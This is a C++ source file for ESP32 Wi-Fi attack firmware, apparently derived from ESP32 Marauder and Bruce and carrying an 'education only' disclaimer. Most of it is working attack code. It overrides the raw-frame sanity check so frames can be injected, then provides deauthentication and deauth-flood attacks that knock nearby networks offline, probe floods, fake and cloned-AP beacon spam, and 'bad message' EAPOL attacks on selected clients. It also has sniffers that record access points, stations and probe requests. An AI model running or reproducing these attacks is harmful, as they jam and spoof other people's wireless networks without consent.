#include "wifiheader.h"

/*
    * wifi.cpp (Based ESP32 Marauder By @justcallmekoko, Bruce By @pr3y)
	* /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
	* Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
	* Licensed under the MIT License.
*/


LinkedList<AccessPoint>* access_points;
LinkedList<AccessPoint>* deauth_flood_ap;
LinkedList<Station>* device_station;
LinkedList<ProbeReqSsid>* probe_req_ssids;

bool wifiScanRedraw = false;
bool eapol_scan_send_deauth = false;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337)
      return 1;
    else
      return 0;
}

void WiFiModules::main() {
	if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1) {
		this->wsl_bypass_enable = true;
		Serial.println("[INFO] Wsl bypass enabled");
	}
	else {
		this->wsl_bypass_enable = false;
		Serial.println("[INFO] Wsl bypass disabled");
	}
	
    access_points = new LinkedList<AccessPoint>();
	deauth_flood_ap = new LinkedList<AccessPoint>();
	device_station = new LinkedList<Station>();
	probe_req_ssids = new LinkedList<ProbeReqSsid>();

	esp_wifi_init(&cfg);
	esp_wifi_set_mode(WIFI_AP_STA);
	esp_wifi_start();
	wifi_initialized = true;
	Serial.println("[INFO] WiFi initialized successfully");
	esp_wifi_get_mac(WIFI_IF_AP, this->ap_mac);
	vTaskDelay(10 / portTICK_PERIOD_MS);
	esp_wifi_get_mac(WIFI_IF_STA, this->sta_mac);
	this->setMac();
	this->ShutdownWiFi();
}

bool WiFiModules::ShutdownWiFi() {
	if (wifi_initialized) {

		if (eapol_scan_send_deauth) eapol_scan_send_deauth = false;

		esp_wifi_set_promiscuous(false);
		WiFi.disconnect();
		WiFi.mode(WIFI_OFF);

		//dst_mac = "ff:ff:ff:ff:ff:ff";

		esp_wifi_set_mode(WIFI_MODE_NULL);
		esp_wifi_stop();
		esp_wifi_restore();
		esp_wifi_deinit();
		esp_netif_deinit();
		wifi_initialized = false;

		Serial.println("[INFO] WiFi shutdown successfully");
		return true;
	}
	else {
		Serial.println("[ERROR] WiFi is not initialized, cannot shutdown");
		return false;
	}
}

void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
	if (attack_mode == WIFI_ATTACK_DEAUTH) {
		for (int i = 0; i < 55; i++) sendDeauthAttack();
	}
	else if (attack_mode == WIFI_ATTACK_STA_DEAUTH) {
		for (int x = 0; x < access_points->size(); x++) {
			if (access_points->get(x).selected) {
				AccessPoint sel_ap = access_points->get(x);
				for (int i = 0; i <  sel_ap.stations->size(); i++) {
					if (device_station->get(sel_ap.stations->get(i)).selected) {
						Station sel_sta = device_station->get(sel_ap.stations->get(i));
						for (int y = 0; y < 55; y++)
              				this->sendDeauthFrame(sel_ap.bssid, sel_ap.channel, sel_sta.mac);
					}
				}
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_AUTH) {
		for (int i = 0; i < 55; i++) sendProbeAttack();
	}
	else if (attack_mode == WIFI_ATTACK_RND_BEACON) {
		for (int i = 0; i < 55; i++) sendBeaconRandomSSID();
	}
	else if (attack_mode == WIFI_ATTACK_STA_BEACON) {
		for (int i = 0; i < 7; i++) {
			for (int x = 0; x < GET_SIZE(stable_ssid_beacon); x++) {
				sendCustomESSIDBeacon(stable_ssid_beacon[x]);
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_RIC_BEACON) {
		for (int i = 0; i < 7; i++)
		{
			for (int x = 0; x < GET_SIZE(rick_roll); x++)
				{
					sendCustomESSIDBeacon(rick_roll[x]);
				}
		}
	}
	else if (attack_mode == WIFI_ATTACK_AP_BEACON) {
		for (int i = 0; i < access_points->size(); i++) {
			if (access_points->get(i).selected) {
				sendCustomBeacon(access_points->get(i));     
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_BAD_MSG) {
		for (int i = 0; i < access_points->size(); i++) {
			for (int x = 0; x < access_points->get(i).stations->size(); x++) {
			  	if (device_station->get(access_points->get(i).stations->get(x)).selected) {
					sendEapolBagMsg(access_points->get(i).bssid,
										  access_points->get(i).channel,
										  device_station->get(access_points->get(i).stations->get(x)).mac,
										  access_points->get(i).wpa);
			 	}
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_BAD_MSG_ALL) {
		for (int i = 0; i < access_points->size(); i++) {
			if (access_points->get(i).selected) {
			  for (int x = 0; x < access_points->get(i).stations->size(); x++) {
					sendEapolBagMsg(access_points->get(i).bssid,
										  access_points->get(i).channel,
										  device_station->get(access_points->get(i).stations->get(x)).mac,
										  access_points->get(i).wpa);
			  	}
			}
		}
	}
}

void WiFiModules::StartMode(WiFiScanState mode) {
	if (mode == WIFI_SCAN_OFF) {
		if (wifi_initialized) this->ShutdownWiFi();
		this->packet_sent = 0;
		Serial.println("[INFO] WiFi scan mode is OFF, WiFi shutdown.");
	}
	else if (mode == WIFI_SCAN_AP) {
		this->StartAPWiFiScan();
	}
	else if (mode == WIFI_SCAN_AP_OLD) {
		this->StartAPWiFiScanOld();
	}
	else if (mode == WIFI_SCAN_AP_STA) {
		this->StartAPStaWiFiScan();
	}
	else if (mode == WIFI_SCAN_DEAUTH) {
		this->StartDeauthScan();
	}
	else if (mode == WIFI_SCAN_PROBE_REQ) {
		this->StartProbeReqScan();
	}
	else if (mode == WIFI_SCAN_BEACON) {
		this->StartBeaconScan();
	}
	else if (mode == WIFI_SCAN_EAPOL) {
		this->StartEapolScan();
	}
	else if (mode == WIFI_SCAN_EAPOL_DEAUTH) {
		eapol_scan_send_deauth = true;
		this->StartEapolScan();
	}
	else if (mode == WIFI_SCAN_CH_ANALYZER) {
		this->StartAnalyzerScan();
	}
	else if (mode == WIFI_ATTACK_DEAUTH) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Deauth] Attack!");
	}
	else if (mode == WIFI_ATTACK_STA_DEAUTH) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Station Deauth] Attack!");
	}
	else if (mode == WIFI_ATTACK_DEAUTH_FLOOD) {
		this->StartDeauthFlood();
		Serial.println("[INFO] Starting [Deauth Flood] Attack!");
	}
	else if (mode == WIFI_ATTACK_AUTH) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Probe] Attack!");
	}
	else if (mode == WIFI_ATTACK_RND_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Random Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_STA_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Staring [Stable Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_RIC_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Rick Roll Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_AP_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [AccessPoint Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_BAD_MSG) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Target BadMsg] Attack!");
	}
	else if (mode == WIFI_ATTACK_BAD_MSG_ALL) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [BadMsg All] Attack!");
	}
}

void WiFiModules::StartWiFiAttack(WiFiScanState attack_mode) {
	ap_config.ap.ssid_hidden = 1;
	ap_config.ap.beacon_interval = 10000;
	ap_config.ap.ssid_len = 0;
	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_AP);
	esp_wifi_set_config(WIFI_IF_AP, &ap_config);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);

	esp_wifi_set_max_tx_power(82);
	this->packet_sent = 0;
	wifi_initialized = true;
	Serial.println("[INFO] WiFi re-initialized successfully");
	Serial.println("[INFO] Ready to attack!");
}

void WiFiModules::setMac() {
	wifi_mode_t currentWiFiMode;
  	esp_wifi_get_mode(&currentWiFiMode);
	esp_err_t result_ap = esp_wifi_set_mac(WIFI_IF_AP, this->ap_mac);
	if ((result_ap != ESP_OK) &&
		((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_APSTA) || (currentWiFiMode == WIFI_MODE_NULL)))
        Serial.printf("[WARN] Failed to set AP MAC: %s | 0x%X\n", macToString(this->ap_mac).c_str(), result_ap);
  	else if ((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_APSTA) || (currentWiFiMode == WIFI_MODE_NULL))
    	Serial.printf("[INFO] Successfully set AP MAC: %s\n", macToString(this->ap_mac).c_str());
	esp_err_t result_sta = esp_wifi_set_mac(WIFI_IF_STA, this->sta_mac);
	if ((result_sta != ESP_OK) &&
		((currentWiFiMode == WIFI_MODE_STA) || (currentWiFiMode == WIFI_MODE_APSTA)))
		Serial.printf("[WARN] Failed to set STA MAC: %s | 0x%X\n", macToString(this->sta_mac).c_str(), result_sta);
  	else if ((currentWiFiMode == WIFI_MODE_STA) || (currentWiFiMode == WIFI_MODE_APSTA))
		Serial.printf("[INFO] Successfully set STA MAC: %s\n", macToString(this->sta_mac).c_str());
}

void WiFiModules::changeChannel() {
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	vTaskDelay(1 / portTICK_PERIOD_MS);
}

void WiFiModules::channelHop() {
	this->set_channel = this->set_channel + 1;
	if (this->set_channel > 14) {
		this->set_channel = 1;
	}
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	Serial.printf("[INFO] Changed channel to %d using channel hop\n", this->set_channel);
	vTaskDelay(1 / portTICK_PERIOD_MS);
}

void WiFiModules::channelRandom() {
	this->set_channel = random(14) + 1;
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	//Serial.printf("Channel channel to %d using channel random\n", this->set_channel);
	vTaskDelay(1 / portTICK_PERIOD_MS);
}

void WiFiModules::StartDeauthFlood() {
	if (!deauth_flood_scan_one_shot) {
		delete deauth_flood_ap;
		deauth_flood_ap = new LinkedList<AccessPoint>();

		WiFi.mode(WIFI_STA);
		wifi_initialized = true;
		delay(100);

		deauth_flood_scan_one_shot = true;

		int numNetworks = WiFi.scanNetworks(false, true); // use old scan for deauth flood

		Serial.println("[INFO] Deauth WiFi Scan Done! Total: " + String(numNetworks) + " Found!");

		for (int i = 0; i < numNetworks; i++) {
			AccessPoint ap;
			ap.essid = WiFi.SSID(i);
			ap.channel = static_cast<uint8_t>(WiFi.channel(i));
			uint8_t* bssid = WiFi.BSSID(i);
			if (bssid != nullptr) {
				memcpy(ap.bssid, bssid, 6);
			} else {
				memset(ap.bssid, 0, 6);
			}
			deauth_flood_ap->add(ap);
		}

		if (deauth_flood_ap->size() > 0) deauth_flood_found_ap = true;

		Serial.println("[INFO] Starting Deauth Flood");

		deauth_flood_redraw = true;

		this->StartWiFiAttack(WIFI_ATTACK_DEAUTH_FLOOD);
	}

	//while (!check(selPress)) {
		static unsigned long reScanCounter = 0;
		for (int i = 0; i < deauth_flood_ap->size(); i++) {
			static unsigned long lastReDrawTime = 0;
			this->set_channel = deauth_flood_ap->get(i).channel;
			changeChannel();
			memcpy(&deauth_frame_packet[10], deauth_flood_ap->get(i).bssid, 6);
			memcpy(&deauth_frame_packet[16], deauth_flood_ap->get(i).bssid, 6);
			//for (int j = 0; j < 55; j++) {
				esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
				vTaskDelay(1 / portTICK_RATE_MS);
				esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
				vTaskDelay(1 / portTICK_RATE_MS);
				esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
				vTaskDelay(1 / portTICK_RATE_MS);
			//}
			if (millis() - lastReDrawTime > 500) {
				deauth_flood_redraw = true;
				deauth_flood_target = deauth_flood_ap->get(i).essid;
				vTaskDelay(1 / portTICK_PERIOD_MS);
				lastReDrawTime = millis();
			}
		}
		if (millis() - reScanCounter > 60000) {
			deauth_flood_scan_one_shot = false;
			reScanCounter = millis();
		}
	//}
}

// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp
uint8_t WiFiModules::getSecurityType(const uint8_t* beacon, uint16_t len) {
	const uint8_t* frame = beacon;
	const uint8_t* ies = beacon + 36; // Start of tagged parameters
	uint16_t ies_len = len - 36;
  
	bool hasRSN = false;
	bool hasWPA = false;
	bool hasWEP = false;
	bool isEnterprise = false;
	bool isWPA3 = false;
	bool isWAPI = false;
  
	uint16_t i = 0;
	while (i + 2 <= ies_len) {
	  uint8_t tag_id = ies[i];
	  uint8_t tag_len = ies[i + 1];
  
	  if (i + 2 + tag_len > ies_len) break;
  
	  const uint8_t* tag_data = ies + i + 2;
  
	  // Check for RSN (WPA2)
	  if (tag_id == 48) {
		hasRSN = true;
  
		// WPA2-Enterprise usually uses 802.1X AKM (type 1)
		if (tag_len >= 20 && tag_data[14] == 0x01 && tag_data[15] == 0x00 && tag_data[16] == 0x00 && tag_data[17] == 0x0f && tag_data[18] == 0xac) {
		  isEnterprise = true;
		}
  
		// WPA3 typically uses SAE (type 8)
		if (tag_len >= 20 && tag_data[14] == 0x01 && tag_data[15] == 0x00 && tag_data[16] == 0x00 && tag_data[17] == 0x0f && tag_data[18] == 0xac && tag_data[19] == 0x08) {
		  isWPA3 = true;
		}
	  }
  
	  // Check for WPA (in vendor specific tag)
	  else if (tag_id == 221 && tag_len >= 8 &&
		  tag_data[0] == 0x00 && tag_data[1] == 0x50 && tag_data[2] == 0xF2 && tag_data[3] == 0x01) {
		hasWPA = true;
  
		// WPA-Enterprise (AKM 1)
		if (tag_len >= 20 && tag_data[14] == 0x01 && tag_data[15] == 0x00 && tag_data[16] == 0x00 && tag_data[17] == 0x50 && tag_data[18] == 0xf2) {
		  isEnterprise = true;
		}
	  }
  
	  // Check for WAPI (Chinese standard)
	  else if (tag_id == 221 && tag_len >= 4 &&
		  tag_data[0] == 0x00 && tag_data[1] == 0x14 && tag_data[2] == 0x72 && tag_data[3] == 0x01) {
		isWAPI = true;
	  }
  
	  i += 2 + tag_len;
	}
  
	// Decision tree
	if (isWAPI) return WIFI_SECURITY_WAPI;
	if (hasRSN && isWPA3) return WIFI_SECURITY_WPA3;
	if (hasRSN && isEnterprise) return WIFI_SECURITY_WPA2_ENTERPRISE;
	if (hasRSN && hasWPA) return WIFI_SECURITY_WPA_WPA2_MIXED;
	if (hasRSN) return WIFI_SECURITY_WPA2;
	if (hasWPA) return isEnterprise ? WIFI_SECURITY_WPA2_ENTERPRISE : WIFI_SECURITY_WPA;
	
	// WEP is identified via capability flags
	uint16_t capab_info = ((uint16_t)frame[34] << 8) | frame[35];
	if (capab_info & 0x0010) return WIFI_SECURITY_WEP;
  
	return WIFI_SECURITY_OPEN;
  }

// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp
void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	String essid = "";
	String bssid = "";

	if (type == WIFI_PKT_MGMT) {
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		if ((snifferPacket->payload[0] == 0x80))
    	{
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			bool in_list = false;
			bool mac_match = true;

			for (int i = 0; i < access_points->size(); i++) {
				mac_match = true;

				
				for (int x = 0; x < 6; x++) {
					if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
						mac_match = false;
						break;
					}
				}
				if (mac_match) {
					in_list = true;
					break;
				}
			}

			if (!in_list) {
		
				vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
				for (int i = 0; i < snifferPacket->payload[37]; i++)
				{
					essid.concat((char)snifferPacket->payload[i + 38]);
				}

				bssid.concat(addr);
			
					
				if (essid.isEmpty()) {
					essid = bssid;
				}

				if (!low_memory_warning)
				display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
				else
				display_buffer->add("Low Mem! Ignore!");
				wifiScanRedraw = true;

				String wpastr = "";

				uint8_t security_type = wifi.getSecurityType(snifferPacket->payload, snifferPacket->rx_ctrl.sig_len);

				switch(security_type) {
					case WIFI_SECURITY_OPEN: wpastr = "Open"; break;
					case WIFI_SECURITY_WEP: wpastr = "WEP"; break;
					case WIFI_SECURITY_WPA: wpastr = "WPA"; break;
					case WIFI_SECURITY_WPA2: wpastr = "WPA2"; break;
					case WIFI_SECURITY_WPA2_ENTERPRISE: wpastr = "WPA2/Enterprise"; break;
					case WIFI_SECURITY_WPA3: wpastr = "WPA3"; break;
					case WIFI_SECURITY_WPA_WPA2_MIXED: wpastr = "WPA/WPA2 Mixed"; break;
					case WIFI_SECURITY_WAPI: wpastr = "WAPI"; break;
				}

				AccessPoint _temp_ap = {essid,
					static_cast<uint8_t>(snifferPacket->rx_ctrl.channel),{
					snifferPacket->payload[10],
					snifferPacket->payload[11],
					snifferPacket->payload[12],
					snifferPacket->payload[13],
					snifferPacket->payload[14],
					snifferPacket->payload[15]},
					security_type, wpastr, false, new LinkedList<uint16_t>(),
					{snifferPacket->payload[34], snifferPacket->payload[35]},
					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
				
				if (!low_memory_warning) {
					access_points->add(_temp_ap);
					Serial.println("[INFO] Added: " + essid + "(Ch: " + String(snifferPacket->rx_ctrl.channel) + ")" + " (BSSID: " + bssid \
					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
				} else {
					Serial.println("[WARN] Low Memory! Ignore AP " + essid + "(Ch: " + String(snifferPacket->rx_ctrl.channel) + ")" + " (BSSID: " + bssid \
					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ") - Not added to list");
				}
			}
		}
	}
}

void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	String essid = "";
	String bssid = "";

	if (type == WIFI_PKT_MGMT) {
		len -= 4;

		if ((snifferPacket->payload[0] == 0x80))
    	{
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			bool in_list = false;
			bool mac_match = true;

			for (int i = 0; i < access_points->size(); i++) {
				mac_match = true;

				
				for (int x = 0; x < 6; x++) {
					if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
						mac_match = false;
						break;
					}
				}
				if (mac_match) {
					in_list = true;
					break;
				}
			}

			if (!in_list) {
		
				vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
				for (int i = 0; i < snifferPacket->payload[37]; i++)
				{
					essid.concat((char)snifferPacket->payload[i + 38]);
				}

				bssid.concat(addr);
			
					
				if (essid.isEmpty()) {
					essid = bssid;
				}

				if (!low_memory_warning)
				display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
				else
				display_buffer->add("Low Mem! Ignore!");
				wifiScanRedraw = true;

				String wpastr = "";

				uint8_t security_type = wifi.getSecurityType(snifferPacket->payload, snifferPacket->rx_ctrl.sig_len);

				switch(security_type) {
					case WIFI_SECURITY_OPEN: wpastr = "Open"; break;
					case WIFI_SECURITY_WEP: wpastr = "WEP"; break;
					case WIFI_SECURITY_WPA: wpastr = "WPA"; break;
					case WIFI_SECURITY_WPA2: wpastr = "WPA2"; break;
					case WIFI_SECURITY_WPA2_ENTERPRISE: wpastr = "WPA2/Enterprise"; break;
					case WIFI_SECURITY_WPA3: wpastr = "WPA3"; break;
					case WIFI_SECURITY_WPA_WPA2_MIXED: wpastr = "WPA/WPA2 Mixed"; break;
					case WIFI_SECURITY_WAPI: wpastr = "WAPI"; break;
				}

				AccessPoint _temp_ap = {essid,
					static_cast<uint8_t>(snifferPacket->rx_ctrl.channel),{
					snifferPacket->payload[10],
					snifferPacket->payload[11],
					snifferPacket->payload[12],
					snifferPacket->payload[13],
					snifferPacket->payload[14],
					snifferPacket->payload[15]},
					security_type, wpastr, false, new LinkedList<uint16_t>(),
					{snifferPacket->payload[34], snifferPacket->payload[35]},
					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
				
				if (!low_memory_warning) {
					access_points->add(_temp_ap);
					Serial.println("[INFO] Added: " + essid + "(Ch: " + String(snifferPacket->rx_ctrl.channel) + ")" + " (BSSID: " + bssid \
					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
				} else {
					Serial.println("[WARN] Low Memory! Ignore AP " + essid + "(Ch: " + String(snifferPacket->rx_ctrl.channel) + ")" + " (BSSID: " + bssid \
					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
				}
				
			}
		}
	}

	if (type == WIFI_PKT_DATA) {
		char ap_addr[] = "00:00:00:00:00:00";
		char dst_addr[] = "00:00:00:00:00:00";

		int ap_index = 0;

		// Check if frame has ap in list of APs and determine position
		uint8_t frame_offset = 0;
		int offsets[2] = {10, 4};
		bool matched_ap = false;
		bool ap_is_src = false;

		bool mac_match = true;

		// Check both addrs for AP addr
		for (int y = 0; y < 2; y++) {
		// Iterate through all APs
		for (int i = 0; i < access_points->size(); i++) {
			mac_match = true;
			
			// Go through each byte in addr
			for (int x = 0; x < 6; x++) {
				if (snifferPacket->payload[x + offsets[y]] != access_points->get(i).bssid[x]) {
					mac_match = false;
					break;
				}
			}
			if (mac_match) {
				matched_ap = true;
				if (offsets[y] == 10)
					ap_is_src = true;
				ap_index = i;
				getMAC(ap_addr, snifferPacket->payload, offsets[y]);
				break;
			}
		}
		if (matched_ap)
			break;
		}

		// If did not find ap from list in frame, drop frame
		if (!matched_ap)
			return;
		else {
		if (ap_is_src)
			frame_offset = 4;
		else
			frame_offset = 10;
		}    

		// Check if we already have this station
		bool in_list = false;
		for (int i = 0; i < device_station->size(); i++) {
			mac_match = true;
			
			for (int x = 0; x < 6; x++) {
				if (snifferPacket->payload[x + frame_offset] != device_station->get(i).mac[x]) {
					mac_match = false;
					break;
				}
			}
			if (mac_match) {
				in_list = true;
				break;
			}
		}

		getMAC(dst_addr, snifferPacket->payload, 4);

		// Check if dest is broadcast
		if ((in_list) || (strcmp(dst_addr, "ff:ff:ff:ff:ff:ff") == 0))
			return;
			
		// Add to list of stations
		Station sta = {
						{snifferPacket->payload[frame_offset],
						snifferPacket->payload[frame_offset + 1],
						snifferPacket->payload[frame_offset + 2],
						snifferPacket->payload[frame_offset + 3],
						snifferPacket->payload[frame_offset + 4],
						snifferPacket->payload[frame_offset + 5]},
						false
						};
		
		if (!low_memory_warning) device_station->add(sta);
			
		char sta_addr[] = "00:00:00:00:00:00";
			
		if (ap_is_src) {
			getMAC(sta_addr, snifferPacket->payload, 4);;
		}
		else {
			getMAC(sta_addr, snifferPacket->payload, 10);
		}

		if (!low_memory_warning) {
			Serial.println("[INFO] Added Station " + String(sta_addr)  +" -> Ap:" + access_points->get(ap_index).essid);
			display_buffer->add(String(sta_addr));
			display_buffer->add("->" + access_points->get(ap_index).essid);
		} else {
			Serial.println("[WARN] Low Memory! Ignore Station " + String(sta_addr) + " -> Ap:" + access_points->get(ap_index).essid + " not added to display buffer!");
			display_buffer->add("Low Mem! Ignore!");
		}
		
		wifiScanRedraw = true;

		AccessPoint ap = access_points->get(ap_index);

		if (!low_memory_warning) {
			ap.stations->add(device_station->size() - 1);
		}
		

		access_points->set(ap_index, ap);
	}
}

void WiFiModules::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
		static unsigned long deauthcheck = 0;
		if (millis() - deauthcheck > 50) { // prevent crash
			if (snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 )
			{
				char addr[] = "00:00:00:00:00:00";
				char dst_addr[] = "00:00:00:00:00:00";
				getMAC(addr, snifferPacket->payload, 10);
				getMAC(dst_addr, snifferPacket->payload, 4);
				display_buffer->add(addr);
				display_buffer->add("->" + String(dst_addr));
				wifiScanRedraw = true;
				Serial.println("[INFO] Deauthentication Frame Detected! " + String(addr) + " -> " + String(dst_addr));
			}
			deauthcheck = millis();
		}
	}
}

void WiFiModules::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	if (type == WIFI_PKT_MGMT) {
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		String probe_req_essid = "";
		if (snifferPacket->payload[0] == 0x40)
		{
			vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			for (int i = 0; i < snifferPacket->payload[25]; i++)
			{
				probe_req_essid.concat((char)snifferPacket->payload[26 + i]);
			}

			if (probe_req_essid.length() > 0) {
				bool essidExist = false;
				for (int i = 0; i < probe_req_ssids->size(); i++) {
					ProbeReqSsid cur_probe_ssid = probe_req_ssids->get(i);
					if (cur_probe_ssid.essid == probe_req_essid) {
						cur_probe_ssid.requests++;
					  	probe_req_ssids->set(i, cur_probe_ssid);
						essidExist = true;
						break;
					}
				}
				if (!essidExist) {
					ProbeReqSsid probeReqSsid;
					probeReqSsid.essid = probe_req_essid;
				  	probeReqSsid.requests = 1;
					probeReqSsid.selected = false;
					probeReqSsid.channel = snifferPacket->rx_ctrl.channel;
					probeReqSsid.rssi = snifferPacket->rx_ctrl.rssi;
					if (!low_memory_warning) {
				  		probe_req_ssids->add(probeReqSsid);
					}
				}
			}

			if (!low_memory_warning) {
				display_buffer->add(addr);
				display_buffer->add("->" + probe_req_essid);
			} else display_buffer->add("Low Mem! Ignore!");
			wifiScanRedraw = true;
			Serial.println("[INFO] Probe Detected! Client:" + String(addr) + " Requesting: (CH:" + String(snifferPacket->rx_ctrl.channel) \
			+ ") " + probe_req_essid + " RSSI: " + String(snifferPacket->rx_ctrl.rssi));
      	}
	}
}

void WiFiModules::beaconSnifferCallback(void* buf , wifi_promiscuous_pkt_type_t type) {
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	String essid = "";
	String add_to_buffer = "";

	if (type == WIFI_PKT_MGMT) {
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		uint8_t target_mac[6] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad};

		if (snifferPacket->payload[0] == 0x80)
		{
			bool mac_match = true;
			for (int i = 0; i < 6; i++) {
				if (snifferPacket->payload[10 + i] != target_mac[i]) {
					mac_match = false;
					break;
				}
			}
			if (mac_match) {
				Serial.println("[INFO] Pwnagotchi beacon detected!");
				display_buffer->add("Pwn bc dectected!");
				return;
			}
			vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
			add_to_buffer.concat("C:" + String(snifferPacket->rx_ctrl.channel));
			add_to_buffer.concat(" ");
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			if (snifferPacket->payload[37] <= 0)
				essid.concat(addr);
			else {
				for (int i = 0; i < snifferPacket->payload[37]; i++)
				{
					essid.concat((char)snifferPacket->payload[i + 38]);
				}
			}
			add_to_buffer.concat(essid);
			display_buffer->add(add_to_buffer);
			wifiScanRedraw = true;
			if (essid == String(addr))
				Serial.println("[INFO] Beacon Detected! <Hidden ESSID> (Ch:" + String(snifferPacket->rx_ctrl.channel) + ") " \
				+ "(BSSID:" + String(addr) + ") " + "(RSSI:" + String(snifferPacket->rx_ctrl.rssi) + ")");
			else
				 Serial.println("[INFO] Beacon Detected! " + essid + " (Ch:" + String(snifferPacket->rx_ctrl.channel) + ") " \
				+ "(BSSID:" + String(addr) + ") " + "(RSSI:" + String(snifferPacket->rx_ctrl.rssi) + ")");
		}
	}
}

